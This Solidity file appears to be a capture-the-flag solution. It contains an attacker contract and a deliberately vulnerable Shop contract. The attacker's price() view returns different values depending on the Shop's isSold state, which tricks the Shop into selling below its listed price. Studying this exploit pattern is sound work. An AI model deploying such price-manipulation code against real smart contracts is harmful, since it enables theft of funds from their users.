// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract BuyerAttack {
    address owner;
    Shop ShopContract;

    constructor(address _shopAddr) {
        owner = msg.sender;
        ShopContract = Shop(_shopAddr);
    }

    function price() external view returns (uint _price) {
        bool isAlreadyDoneFirstCall = ShopContract.isSold();
        /* first call */
        if (!isAlreadyDoneFirstCall)
            _price = 101;
            /* second call */
        else _price = 90;
    }

    function callBuy() external {
        ShopContract.buy();
    }
}

interface Buyer {
    function price() external view returns (uint);
}

contract Shop {
    uint public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}
